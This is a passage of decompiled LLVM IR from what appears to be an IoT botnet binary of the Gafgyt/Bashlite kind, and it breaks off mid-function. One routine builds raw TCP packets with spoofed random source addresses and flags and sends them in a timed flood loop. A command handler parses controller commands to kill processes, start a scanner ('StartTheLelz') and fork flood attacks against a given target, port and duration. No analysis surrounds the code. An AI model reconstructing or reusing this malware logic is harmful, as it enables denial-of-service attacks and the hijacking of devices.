dec_label_pc_cfe4:                                ; preds = %dec_label_pc_cfb0, %dec_label_pc_cfc8
  %v3_cff4 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  %v2_cffc = icmp eq i32 %v3_cff4, 0
  br i1 %v2_cffc, label %dec_label_pc_d008, label %dec_label_pc_d644

dec_label_pc_d008:                                ; preds = %dec_label_pc_cfe4
  store i32 8, i32* @r2, align 4
  %v2_d01c = bitcast i32* %stack_var_-60 to i8*
  %v3_d01c = call i32 @__GI_memset(i8* %v2_d01c, i32 0)
  store i32 6, i32* @r2, align 4
  %v3_d02c = call i32 @socket(i32 2, i32 3, i32 6)
  %v2_d03c = icmp eq i32 %v3_d02c, 0
  br i1 %v2_d03c, label %dec_label_pc_d044, label %dec_label_pc_d05c

dec_label_pc_d044:                                ; preds = %dec_label_pc_d008
  %v2_d048 = load i32, i32* @global_var_272d0.45, align 4
  %v3_d054 = call i32 @Rootsprintf(i32 %v2_d048, i32 ptrtoint ([27 x i8]* @global_var_1cf0c.468 to i32))
  br label %dec_label_pc_d644

dec_label_pc_d05c:                                ; preds = %dec_label_pc_d008
  store i32 1, i32* %stack_var_-72, align 4
  %v2_d064 = ptrtoint i32* %stack_var_-72 to i32
  store i32 3, i32* @r2, align 4
  %v5_d080 = call i32 @__GI_setsockopt(i32 %v3_d02c, i32 0, i32 3, i32 %v2_d064, i32 4)
  %v1_d088 = icmp slt i32 %v5_d080, 0
  br i1 %v1_d088, label %dec_label_pc_d090, label %dec_label_pc_d0a8

dec_label_pc_d090:                                ; preds = %dec_label_pc_d05c
  %v2_d094 = load i32, i32* @global_var_272d0.45, align 4
  %v3_d0a0 = call i32 @Rootsprintf(i32 %v2_d094, i32 ptrtoint ([33 x i8]* @global_var_1cf28.470 to i32))
  br label %dec_label_pc_d644

dec_label_pc_d0a8:                                ; preds = %dec_label_pc_d05c
  %v2_d0ac = icmp eq i32 %arg4, 0
  br i1 %v2_d0ac, label %dec_label_pc_d0d8, label %dec_label_pc_d0c0

dec_label_pc_d0c0:                                ; preds = %dec_label_pc_d0a8
  %v1_d0c4 = sub i32 32, %arg4
  store i32 %v1_d0c4, i32* %r2.global-to-local, align 4
  %v1_d0d0 = shl i32 -1, %v1_d0c4
  br label %dec_label_pc_d0d8

dec_label_pc_d0d8:                                ; preds = %dec_label_pc_d0a8, %dec_label_pc_d0c0
  %storemerge9 = phi i32 [ %v1_d0d0, %dec_label_pc_d0c0 ], [ 0, %dec_label_pc_d0a8 ]
  %v1_d0dc = add i32 %arg6, 40
  %v1_d0ec = add i32 %arg6, 54
  %v3_d0f0 = and i32 %v1_d0ec, -8
  %v1_d0f8 = load i32, i32* @sp, align 4
  %v2_d0f8 = sub i32 %v1_d0f8, %v3_d0f0
  %v1_d108 = add i32 %v2_d0f8, 15
  %v3_d10c = and i32 %v1_d108, -8
  store i32 %v3_d10c, i32* %r2.global-to-local, align 4
  %v1_d12c = add i32 %v3_d10c, 20
  %v5_d130 = inttoptr i32 %v1_d12c to i16*
  %v3_d134 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_d134, i32* @r4, align 4
  %v1_d13c = call i32 @GetRandomIP(i32 %storemerge9)
  %v1_d148 = call i32 @__GI_htonl(i32 %v1_d13c)
  store i32 %v1_d148, i32* %r2.global-to-local, align 4
  %v1_d154 = add i32 %arg6, 20
  %v1_d158 = load i32, i32* @sp, align 4
  %v2_d158 = inttoptr i32 %v1_d158 to i32*
  store i32 %v1_d154, i32* %v2_d158, align 4
  %v0_d160 = load i32, i32* @r4, align 4
  %v4_d168 = inttoptr i32 %v3_d10c to i8*
  %v5_d168 = call i32 @makeIPPacket(i8* %v4_d168, i32 %v0_d160, i32 %v1_d148, i32 6)
  %v0_d16c = call i32 @rand_cmwc()
  %v3_d178 = urem i32 %v0_d16c, 65536
  store i32 %v3_d178, i32* %r2.global-to-local, align 4
  %v1_d180 = trunc i32 %v0_d16c to i16
  store i16 %v1_d180, i16* %v5_d130, align 4
  %v0_d184 = call i32 @rand_cmwc()
  %v2_d190 = add i32 %v3_d10c, 24
  %v3_d190 = inttoptr i32 %v2_d190 to i32*
  store i32 %v0_d184, i32* %v3_d190, align 8
  %v2_d19c = add i32 %v3_d10c, 28
  %v3_d19c = inttoptr i32 %v2_d19c to i32*
  store i32 0, i32* %v3_d19c, align 4
  store i32 %v1_d12c, i32* %r2.global-to-local, align 4
  %v1_d1a4 = add i32 %v3_d10c, 32
  %v2_d1a4 = inttoptr i32 %v1_d1a4 to i8*
  %v3_d1a4 = load i8, i8* %v2_d1a4, align 8
  %v1_d1b0 = urem i8 %v3_d1a4, 16
  %v1_d1b4 = or i8 %v1_d1b0, 80
  store i8 %v1_d1b4, i8* %v2_d1a4, align 8
  %v3_d1c4 = load i32, i32* %stack_var_0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1cf4c.475 to i32), i32* @r1, align 4
  %v3_d1d0 = inttoptr i32 %v3_d1c4 to i8*
  %v4_d1d0 = call i32 @__GI_strcoll(i8* %v3_d1d0, i32 ptrtoint ([4 x i8]* @global_var_1cf4c.475 to i32))
  %v2_d1d8 = icmp eq i32 %v4_d1d0, 0
  br i1 %v2_d1d8, label %dec_label_pc_d1e0, label %dec_label_pc_d298

dec_label_pc_d1e0:                                ; preds = %dec_label_pc_d0d8
  store i32 %v1_d12c, i32* %r2.global-to-local, align 4
  %v1_d1e4 = add i32 %v3_d10c, 33
  %v2_d1e4 = inttoptr i32 %v1_d1e4 to i8*
  %v3_d1e4 = load i8, i8* %v2_d1e4, align 1
  %v1_d1f4 = or i8 %v3_d1e4, 2
  store i8 %v1_d1f4, i8* %v2_d1e4, align 1
  store i32 %v1_d12c, i32* %r2.global-to-local, align 4
  %v3_d208 = load i8, i8* %v2_d1e4, align 1
  %v1_d218 = or i8 %v3_d208, 4
  store i8 %v1_d218, i8* %v2_d1e4, align 1
  store i32 %v1_d12c, i32* %r2.global-to-local, align 4
  %v3_d22c = load i8, i8* %v2_d1e4, align 1
  %v1_d23c = or i8 %v3_d22c, 1
  store i8 %v1_d23c, i8* %v2_d1e4, align 1
  store i32 %v1_d12c, i32* %r2.global-to-local, align 4
  %v3_d250 = load i8, i8* %v2_d1e4, align 1
  %v1_d260 = or i8 %v3_d250, 16
  store i8 %v1_d260, i8* %v2_d1e4, align 1
  store i32 %v1_d12c, i32* %r2.global-to-local, align 4
  %v3_d274 = load i8, i8* %v2_d1e4, align 1
  %v1_d284 = or i8 %v3_d274, 8
  store i8 %v1_d284, i8* %v2_d1e4, align 1
  br label %dec_label_pc_d440

dec_label_pc_d298:                                ; preds = %dec_label_pc_d0d8
  %v3_d298 = load i32, i32* %stack_var_0, align 4
  %v2_d2a4 = call i32 @__GI_strtok(i32 %v3_d298, i32 ptrtoint (i32* @global_var_1cf50.477 to i32))
  %v2_d43818 = icmp eq i32 %v2_d2a4, 0
  br i1 %v2_d43818, label %dec_label_pc_d440, label %dec_label_pc_d2b4.lr.ph

dec_label_pc_d2b4.lr.ph:                          ; preds = %dec_label_pc_d298
  %v1_d2d4 = add i32 %v3_d10c, 33
  %v2_d2d4 = inttoptr i32 %v1_d2d4 to i8*
  br label %dec_label_pc_d2b4

dec_label_pc_d2b4:                                ; preds = %dec_label_pc_d2b4.lr.ph, %dec_label_pc_d420
  %storemerge1319 = phi i32 [ %v2_d2a4, %dec_label_pc_d2b4.lr.ph ], [ %v2_d428, %dec_label_pc_d420 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1cf54.479 to i32), i32* @r1, align 4
  %v3_d2c0 = inttoptr i32 %storemerge1319 to i8*
  %v4_d2c0 = call i32 @__GI_strcoll(i8* %v3_d2c0, i32 ptrtoint ([4 x i8]* @global_var_1cf54.479 to i32))
  %v2_d2c8 = icmp eq i32 %v4_d2c0, 0
  br i1 %v2_d2c8, label %dec_label_pc_d2d0, label %dec_label_pc_d2f8

dec_label_pc_d2d0:                                ; preds = %dec_label_pc_d2b4
  %v3_d2d4 = load i8, i8* %v2_d2d4, align 1
  %v4_d2dc = zext i8 %v3_d2d4 to i32
  %v1_d2e4 = or i32 %v4_d2dc, 2
  store i32 %v1_d2e4, i32* %r2.global-to-local, align 4
  %v1_d2f0 = trunc i32 %v1_d2e4 to i8
  store i8 %v1_d2f0, i8* %v2_d2d4, align 1
  br label %dec_label_pc_d420

dec_label_pc_d2f8:                                ; preds = %dec_label_pc_d2b4
  store i32 ptrtoint ([4 x i8]* @global_var_1cf58.481 to i32), i32* @r1, align 4
  %v4_d304 = call i32 @__GI_strcoll(i8* %v3_d2c0, i32 ptrtoint ([4 x i8]* @global_var_1cf58.481 to i32))
  %v2_d30c = icmp eq i32 %v4_d304, 0
  br i1 %v2_d30c, label %dec_label_pc_d314, label %dec_label_pc_d33c

dec_label_pc_d314:                                ; preds = %dec_label_pc_d2f8
  %v3_d318 = load i8, i8* %v2_d2d4, align 1
  %v4_d320 = zext i8 %v3_d318 to i32
  %v1_d328 = or i32 %v4_d320, 4
  store i32 %v1_d328, i32* %r2.global-to-local, align 4
  %v1_d334 = trunc i32 %v1_d328 to i8
  store i8 %v1_d334, i8* %v2_d2d4, align 1
  br label %dec_label_pc_d420

dec_label_pc_d33c:                                ; preds = %dec_label_pc_d2f8
  store i32 ptrtoint ([4 x i8]* @global_var_1cf5c.483 to i32), i32* @r1, align 4
  %v4_d348 = call i32 @__GI_strcoll(i8* %v3_d2c0, i32 ptrtoint ([4 x i8]* @global_var_1cf5c.483 to i32))
  %v2_d350 = icmp eq i32 %v4_d348, 0
  br i1 %v2_d350, label %dec_label_pc_d358, label %dec_label_pc_d380

dec_label_pc_d358:                                ; preds = %dec_label_pc_d33c
  %v3_d35c = load i8, i8* %v2_d2d4, align 1
  %v4_d364 = zext i8 %v3_d35c to i32
  %v1_d36c = or i32 %v4_d364, 1
  store i32 %v1_d36c, i32* %r2.global-to-local, align 4
  %v1_d378 = trunc i32 %v1_d36c to i8
  store i8 %v1_d378, i8* %v2_d2d4, align 1
  br label %dec_label_pc_d420

dec_label_pc_d380:                                ; preds = %dec_label_pc_d33c
  store i32 ptrtoint ([4 x i8]* @global_var_1cf60.485 to i32), i32* @r1, align 4
  %v4_d38c = call i32 @__GI_strcoll(i8* %v3_d2c0, i32 ptrtoint ([4 x i8]* @global_var_1cf60.485 to i32))
  %v2_d394 = icmp eq i32 %v4_d38c, 0
  br i1 %v2_d394, label %dec_label_pc_d39c, label %dec_label_pc_d3c4

dec_label_pc_d39c:                                ; preds = %dec_label_pc_d380
  %v3_d3a0 = load i8, i8* %v2_d2d4, align 1
  %v4_d3a8 = zext i8 %v3_d3a0 to i32
  %v1_d3b0 = or i32 %v4_d3a8, 16
  store i32 %v1_d3b0, i32* %r2.global-to-local, align 4
  %v1_d3bc = trunc i32 %v1_d3b0 to i8
  store i8 %v1_d3bc, i8* %v2_d2d4, align 1
  br label %dec_label_pc_d420

dec_label_pc_d3c4:                                ; preds = %dec_label_pc_d380
  store i32 ptrtoint ([4 x i8]* @global_var_1cf64.487 to i32), i32* @r1, align 4
  %v4_d3d0 = call i32 @__GI_strcoll(i8* %v3_d2c0, i32 ptrtoint ([4 x i8]* @global_var_1cf64.487 to i32))
  %v2_d3d8 = icmp eq i32 %v4_d3d0, 0
  br i1 %v2_d3d8, label %dec_label_pc_d3e0, label %dec_label_pc_d408

dec_label_pc_d3e0:                                ; preds = %dec_label_pc_d3c4
  %v3_d3e4 = load i8, i8* %v2_d2d4, align 1
  %v4_d3ec = zext i8 %v3_d3e4 to i32
  %v1_d3f4 = or i32 %v4_d3ec, 8
  store i32 %v1_d3f4, i32* %r2.global-to-local, align 4
  %v1_d400 = trunc i32 %v1_d3f4 to i8
  store i8 %v1_d400, i8* %v2_d2d4, align 1
  br label %dec_label_pc_d420

dec_label_pc_d408:                                ; preds = %dec_label_pc_d3c4
  %v2_d40c = load i32, i32* @global_var_272d0.45, align 4
  store i32 %storemerge1319, i32* @r2, align 4
  %v3_d41c = call i32 @Rootsprintf(i32 %v2_d40c, i32 ptrtoint ([18 x i8]* @global_var_1cf68.489 to i32))
  br label %dec_label_pc_d420

dec_label_pc_d420:                                ; preds = %dec_label_pc_d3e0, %dec_label_pc_d39c, %dec_label_pc_d358, %dec_label_pc_d314, %dec_label_pc_d2d0, %dec_label_pc_d408
  %v2_d428 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1cf50.477 to i32))
  %v2_d438 = icmp eq i32 %v2_d428, 0
  br i1 %v2_d438, label %dec_label_pc_d440, label %dec_label_pc_d2b4

dec_label_pc_d440:                                ; preds = %dec_label_pc_d420, %dec_label_pc_d298, %dec_label_pc_d1e0
  %v0_d440 = call i32 @rand_cmwc()
  %v1_d454 = trunc i32 %v0_d440 to i16
  %v3_d454 = add i32 %v3_d10c, 34
  %v4_d454 = inttoptr i32 %v3_d454 to i16*
  store i16 %v1_d454, i16* %v4_d454, align 2
  %v3_d460 = add i32 %v3_d10c, 36
  %v4_d460 = inttoptr i32 %v3_d460 to i16*
  store i16 0, i16* %v4_d460, align 4
  store i32 %v1_d12c, i32* %r2.global-to-local, align 4
  %v3_d46c = add i32 %v3_d10c, 38
  %v4_d46c = inttoptr i32 %v3_d46c to i16*
  store i16 0, i16* %v4_d46c, align 2
  br i1 %v2_cfa8, label %dec_label_pc_d47c, label %dec_label_pc_d494

dec_label_pc_d47c:                                ; preds = %dec_label_pc_d440
  %v0_d47c = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_d47c to i16
  br label %dec_label_pc_d4b0

dec_label_pc_d494:                                ; preds = %dec_label_pc_d440
  %v3_d49c = urem i32 %arg2, 65536
  %v1_d4a4 = call i32 @__GI_htons(i32 %v3_d49c)
  %extract.t72 = trunc i32 %v1_d4a4 to i16
  br label %dec_label_pc_d4b0

dec_label_pc_d4b0:                                ; preds = %dec_label_pc_d47c, %dec_label_pc_d494
  %v0_d47c.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_d47c ], [ %extract.t72, %dec_label_pc_d494 ]
  %v3_d4b8 = add i32 %v3_d10c, 22
  %v4_d4b8 = inttoptr i32 %v3_d4b8 to i16*
  store i16 %v0_d47c.sink.off0, i16* %v4_d4b8, align 2
  %v2_d4c4 = call i32 @tcpcsum(i32 %v3_d10c, i32 %v1_d12c)
  %v1_d4d4 = trunc i32 %v2_d4c4 to i16
  store i16 %v1_d4d4, i16* %v4_d460, align 4
  store i32 %v3_d10c, i32* %r2.global-to-local, align 4
  %v1_d4e4 = or i32 %v3_d10c, 2
  %v2_d4e4 = inttoptr i32 %v1_d4e4 to i16*
  %v3_d4e4 = load i16, i16* %v2_d4e4, align 2
  %v4_d4e4 = zext i16 %v3_d4e4 to i32
  %v2_d4f0 = inttoptr i32 %v3_d10c to i16*
  %v3_d4f0 = call i32 @csum(i16* %v2_d4f0, i32 %v4_d4e4)
  %sext3 = mul i32 %v3_d4f0, 65536
  %v1_d4f4 = sdiv i32 %sext3, 65536
  store i32 %v1_d4f4, i32* %r2.global-to-local, align 4
  %v1_d500 = trunc i32 %v1_d4f4 to i16
  %v3_d500 = add i32 %v3_d10c, 10
  %v4_d500 = inttoptr i32 %v3_d500 to i16*
  store i16 %v1_d500, i16* %v4_d500, align 2
  %v2_d508 = call i32 @__GI_time(i32* null)
  %v2_d514 = add i32 %v2_d508, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d528 = ptrtoint i32* %stack_var_-68 to i32
  %v2_d568 = add i32 %v3_d10c, 12
  %v3_d568 = inttoptr i32 %v2_d568 to i32*
  %v3_d580 = or i32 %v3_d10c, 4
  %v4_d580 = inttoptr i32 %v3_d580 to i16*
  br label %dec_label_pc_d524

dec_label_pc_d524:                                ; preds = %dec_label_pc_d634, %dec_label_pc_d628, %dec_label_pc_d4b0
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_d4b0 ], [ 0, %dec_label_pc_d628 ], [ %v1_d638, %dec_label_pc_d634 ]
  store i32 %v3_d10c, i32* %r2.global-to-local, align 4
  %v1_d52c = load i32, i32* @sp, align 4
  %v2_d52c = inttoptr i32 %v1_d52c to i32*
  store i32 %v2_d528, i32* %v2_d52c, align 4
  %v1_d534 = load i32, i32* @sp, align 4
  %v2_d534 = add i32 %v1_d534, 4
  %v3_d534 = inttoptr i32 %v2_d534 to i32*
  store i32 16, i32* %v3_d534, align 4
  %v0_d53c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_d0dc, i32* %r2.global-to-local, align 4
  %v6_d548 = call i32 @__libc_sendto(i32 %v3_d02c, i32 %v0_d53c, i32 %v1_d0dc, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_d550 = call i32 @GetRandomIP(i32 %storemerge9)
  %v1_d55c = call i32 @__GI_htonl(i32 %v1_d550)
  store i32 %v1_d55c, i32* %r2.global-to-local, align 4
  store i32 %v1_d55c, i32* %v3_d568, align 4
  %v0_d56c = call i32 @rand_cmwc()
  %v3_d578 = urem i32 %v0_d56c, 65536
  store i32 %v3_d578, i32* %r2.global-to-local, align 4
  %v1_d580 = trunc i32 %v0_d56c to i16
  store i16 %v1_d580, i16* %v4_d580, align 4
  %v0_d584 = call i32 @rand_cmwc()
  store i32 %v0_d584, i32* %r2.global-to-local, align 4
  store i32 %v0_d584, i32* %v3_d190, align 8
  %v0_d594 = call i32 @rand_cmwc()
  %v1_d5a8 = trunc i32 %v0_d594 to i16
  store i16 %v1_d5a8, i16* %v5_d130, align 4
  store i32 %v1_d12c, i32* %r2.global-to-local, align 4
  store i16 0, i16* %v4_d460, align 4
  %v4_d5c0 = call i32 @tcpcsum(i32 %v3_d10c, i32 %v1_d12c)
  %v1_d5d0 = trunc i32 %v4_d5c0 to i16
  store i16 %v1_d5d0, i16* %v4_d460, align 4
  store i32 %v3_d10c, i32* %r2.global-to-local, align 4
  %v3_d5e0 = load i16, i16* %v2_d4e4, align 2
  %v4_d5e0 = zext i16 %v3_d5e0 to i32
  %v3_d5ec = call i32 @csum(i16* %v2_d4f0, i32 %v4_d5e0)
  %sext5 = mul i32 %v3_d5ec, 65536
  %v1_d5f0 = sdiv i32 %sext5, 65536
  store i32 %v1_d5f0, i32* %r2.global-to-local, align 4
  %v1_d5fc = trunc i32 %v1_d5f0 to i16
  store i16 %v1_d5fc, i16* %v4_d500, align 2
  %v9_d608 = icmp eq i32 %stack_var_-92.0, %arg7
  br i1 %v9_d608, label %dec_label_pc_d610, label %dec_label_pc_d634

dec_label_pc_d610:                                ; preds = %dec_label_pc_d524
  %v2_d614 = call i32 @__GI_time(i32* null)
  store i32 %v2_d614, i32* %r2.global-to-local, align 4
  %v8_d624 = icmp sgt i32 %v2_d614, %v2_d514
  br i1 %v8_d624, label %dec_label_pc_d644, label %dec_label_pc_d628

dec_label_pc_d628:                                ; preds = %dec_label_pc_d610
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d524

dec_label_pc_d634:                                ; preds = %dec_label_pc_d524
  %v1_d638 = add i32 %stack_var_-92.0, 1
  br label %dec_label_pc_d524

dec_label_pc_d644:                                ; preds = %dec_label_pc_d610, %dec_label_pc_cfe4, %dec_label_pc_d090, %dec_label_pc_d044
  %v1_d650 = phi i32 [ %v3_cff4, %dec_label_pc_cfe4 ], [ %v3_d0a0, %dec_label_pc_d090 ], [ %v3_d054, %dec_label_pc_d044 ], [ %v2_d614, %dec_label_pc_d610 ]
  ret i32 %v1_d650

; uselistorder directives
  uselistorder i32 %v1_d5f0, { 1, 0 }
  uselistorder i32 %v0_d56c, { 1, 0 }
  uselistorder i32 %v1_d4f4, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i8* %v2_d2d4, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i8* %v2_d1e4, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v0_d16c, { 1, 0 }
  uselistorder i32 %v1_d12c, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10 }
  uselistorder i32 %v3_d10c, { 9, 8, 6, 19, 7, 5, 21, 18, 4, 3, 17, 16, 15, 14, 13, 20, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_d0dc, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @__GI_htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d644, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_d4b0, { 1, 0 }
  uselistorder label %dec_label_pc_d420, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_d2b4, { 1, 0 }
  uselistorder label %dec_label_pc_d0d8, { 1, 0 }
  uselistorder label %dec_label_pc_cfe4, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_d684 = load i32, i32* @r4, align 4
  %v6_d684 = load i32, i32* @r5, align 4
  %v9_d684 = load i32, i32* @r6, align 4
  %v12_d684 = load i32, i32* @r7, align 4
  %v15_d684 = load i32, i32* @r8, align 4
  %v18_d684 = load i32, i32* @fp, align 4
  store i32 54924, i32* %stack_var_-4, align 4
  %v2_d688 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d688, i32* @fp, align 4
  %v2_d69c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1cc08.47 to i32), i32* @r1, align 4
  %v3_d6a8 = inttoptr i32 %v2_d69c to i8*
  %v4_d6a8 = call i32 @__GI_strcoll(i8* %v3_d6a8, i32 ptrtoint ([5 x i8]* @global_var_1cc08.47 to i32))
  %v2_d6b0 = icmp eq i32 %v4_d6a8, 0
  br i1 %v2_d6b0, label %dec_label_pc_d6b8, label %dec_label_pc_d6d0

dec_label_pc_d6b8:                                ; preds = %entry
  %v2_d6bc = load i32, i32* @global_var_272d0.45, align 4
  %v3_d6c8 = call i32 @Rootsprintf(i32 %v2_d6bc, i32 ptrtoint ([6 x i8]* @global_var_1cf7c.493 to i32))
  br label %dec_label_pc_e268

dec_label_pc_d6d0:                                ; preds = %entry
  %v2_d6d4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1cf84.495 to i32), i32* @r1, align 4
  %v3_d6e0 = inttoptr i32 %v2_d6d4 to i8*
  %v4_d6e0 = call i32 @__GI_strcoll(i8* %v3_d6e0, i32 ptrtoint ([6 x i8]* @global_var_1cf84.495 to i32))
  %v2_d6e8 = icmp eq i32 %v4_d6e0, 0
  br i1 %v2_d6e8, label %dec_label_pc_d6f0, label %dec_label_pc_d7e4

dec_label_pc_d6f0:                                ; preds = %dec_label_pc_d6d0
  %v1_d6f4 = add i32 %tmp, 4
  %v1_d6f8 = inttoptr i32 %v1_d6f4 to i32*
  %v2_d6f8 = load i32, i32* %v1_d6f8, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1cf8c.497 to i32), i32* @r1, align 4
  %v3_d704 = inttoptr i32 %v2_d6f8 to i8*
  %v4_d704 = call i32 @__GI_strcoll(i8* %v3_d704, i32 ptrtoint ([4 x i8]* @global_var_1cf8c.497 to i32))
  %v2_d70c = icmp eq i32 %v4_d704, 0
  br i1 %v2_d70c, label %dec_label_pc_d714, label %dec_label_pc_d758

dec_label_pc_d714:                                ; preds = %dec_label_pc_d6f0
  %v2_d718 = load i32, i32* @global_var_2d53c.499, align 4
  %v2_d71c = icmp eq i32 %v2_d718, 0
  br i1 %v2_d71c, label %dec_label_pc_e268, label %dec_label_pc_d724

dec_label_pc_d724:                                ; preds = %dec_label_pc_d714
  %v2_d734 = call i32 @kill(i32 %v2_d718, i32 9)
  %v2_d73c = load i32, i32* @global_var_272d0.45, align 4
  %v3_d748 = call i32 @Rootsprintf(i32 %v2_d73c, i32 ptrtoint ([14 x i8]* @global_var_1cf90.501 to i32))
  store i32 0, i32* @global_var_2d53c.499, align 4
  br label %dec_label_pc_d758

dec_label_pc_d758:                                ; preds = %dec_label_pc_d6f0, %dec_label_pc_d724
  %v2_d760 = load i32, i32* %v1_d6f8, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1cfa0.503 to i32), i32* @r1, align 4
  %v3_d76c = inttoptr i32 %v2_d760 to i8*
  %v4_d76c = call i32 @__GI_strcoll(i8* %v3_d76c, i32 ptrtoint ([3 x i8]* @global_var_1cfa0.503 to i32))
  store i32 %v4_d76c, i32* @r0, align 4
  %v2_d774 = icmp eq i32 %v4_d76c, 0
  br i1 %v2_d774, label %dec_label_pc_d77c, label %dec_label_pc_d7e4

dec_label_pc_d77c:                                ; preds = %dec_label_pc_d758
  %v2_d780 = load i32, i32* @global_var_2d53c.499, align 4
  %v2_d784 = icmp eq i32 %v2_d780, 0
  br i1 %v2_d784, label %dec_label_pc_d78c, label %dec_label_pc_e268

dec_label_pc_d78c:                                ; preds = %dec_label_pc_d77c
  %v0_d78c = call i32 @__libc_fork()
  %v2_d7ac = icmp eq i32 %v0_d78c, 0
  br i1 %v2_d7ac, label %dec_label_pc_d7d0, label %dec_label_pc_d7b4

dec_label_pc_d7b4:                                ; preds = %dec_label_pc_d78c
  store i32 %v0_d78c, i32* @global_var_2d53c.499, align 4
  br label %dec_label_pc_e268

dec_label_pc_d7d0:                                ; preds = %dec_label_pc_d78c
  %v2_d7d8 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_d7e0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_d7e4

dec_label_pc_d7e4:                                ; preds = %dec_label_pc_d758, %dec_label_pc_d6d0, %dec_label_pc_d7d0
  %v2_d7e8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1cfa4.505 to i32), i32* @r1, align 4
  %v3_d7f4 = inttoptr i32 %v2_d7e8 to i8*
  %v4_d7f4 = call i32 @__GI_strcoll(i8* %v3_d7f4, i32 ptrtoint ([5 x i8]* @global_var_1cfa4.505 to i32))
  %v2_d7fc = icmp eq i32 %v4_d7f4, 0
  br i1 %v2_d7fc, label %dec_label_pc_d804, label %dec_label_pc_d974

dec_label_pc_d804:                                ; preds = %dec_label_pc_d7e4
  %v7_d80c = icmp slt i32 %arg1, 6
  br i1 %v7_d80c, label %dec_label_pc_e268, label %dec_label_pc_d810

dec_label_pc_d810:                                ; preds = %dec_label_pc_d804
  %v1_d814 = add i32 %tmp, 12
  %v1_d818 = inttoptr i32 %v1_d814 to i32*
  %v2_d818 = load i32, i32* %v1_d818, align 4
  store i32 %v2_d818, i32* @r0, align 4
  %v1_d820 = call i32 @atol(i32 %v2_d818)
  %tmp81 = icmp slt i32 %v1_d820, 1
  br i1 %tmp81, label %dec_label_pc_e268, label %dec_label_pc_d830

dec_label_pc_d830:                                ; preds = %dec_label_pc_d810
  %v1_d834 = add i32 %tmp, 20
  %v1_d838 = inttoptr i32 %v1_d834 to i32*
  %v2_d838 = load i32, i32* %v1_d838, align 4
  store i32 %v2_d838, i32* @r0, align 4
  %v1_d840 = call i32 @atol(i32 %v2_d838)
  store i32 %v1_d840, i32* @r0, align 4
  %v5_d84c = icmp sgt i32 %v1_d840, 0
  br i1 %v5_d84c, label %dec_label_pc_d854, label %dec_label_pc_e268

dec_label_pc_d854:                                ; preds = %dec_label_pc_d830
  %v0_d854 = call i32 @listFork()
  %v2_d85c = icmp eq i32 %v0_d854, 0
  br i1 %v2_d85c, label %dec_label_pc_d864, label %dec_label_pc_e268

dec_label_pc_d864:                                ; preds = %dec_label_pc_d854
  %v2_d868 = load i32, i32* @global_var_272d0.45, align 4
  store i32 %v2_d868, i32* @r5, align 4
  %v1_d870 = add i32 %tmp, 4
  %v1_d874 = inttoptr i32 %v1_d870 to i32*
  %v2_d874 = load i32, i32* %v1_d874, align 4
  store i32 %v2_d874, i32* @r6, align 4
  %v1_d87c = add i32 %tmp, 8
  %v1_d880 = inttoptr i32 %v1_d87c to i32*
  %v2_d880 = load i32, i32* %v1_d880, align 4
  store i32 %v2_d880, i32* @r7, align 4
  %v2_d88c = load i32, i32* %v1_d818, align 4
  store i32 %v2_d88c, i32* @r0, align 4
  %v1_d894 = call i32 @atol(i32 %v2_d88c)
  store i32 %v1_d894, i32* @r4, align 4
  %v2_d8a4 = load i32, i32* %v1_d838, align 4
  store i32 %v2_d8a4, i32* @r0, align 4
  %v1_d8ac = call i32 @atol(i32 %v2_d8a4)
  %v0_d8bc = load i32, i32* @r5, align 4
  %v0_d8c4 = load i32, i32* @r6, align 4
  store i32 %v0_d8c4, i32* @r2, align 4
